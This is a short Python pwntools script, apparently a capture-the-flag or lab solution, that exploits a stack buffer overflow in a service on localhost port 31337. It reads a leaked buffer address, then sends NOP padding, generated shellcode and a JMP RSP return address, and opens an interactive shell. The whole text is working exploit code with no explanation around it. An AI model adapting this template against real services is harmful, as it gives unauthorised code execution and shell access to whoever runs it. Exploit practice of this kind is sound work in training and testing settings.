#!/usr/bin/env python3

from pwn import *
context.arch = "amd64"

io = remote("127.0.0.1", 31337)

buffer = int(io.recvuntil(b"]")[1:-1], 16)
info("buffer @ %#x" % buffer)

JMP_RSP = 0x00000000004015e8

offset = 0x108
payload = b"\x90" * 10 + asm(shellcraft.sh())
payload += b"\x90" * (offset - len(payload) - 8)
payload += p64(buffer)
payload += p64(JMP_RSP)

io.sendline(payload)

io.interactive()
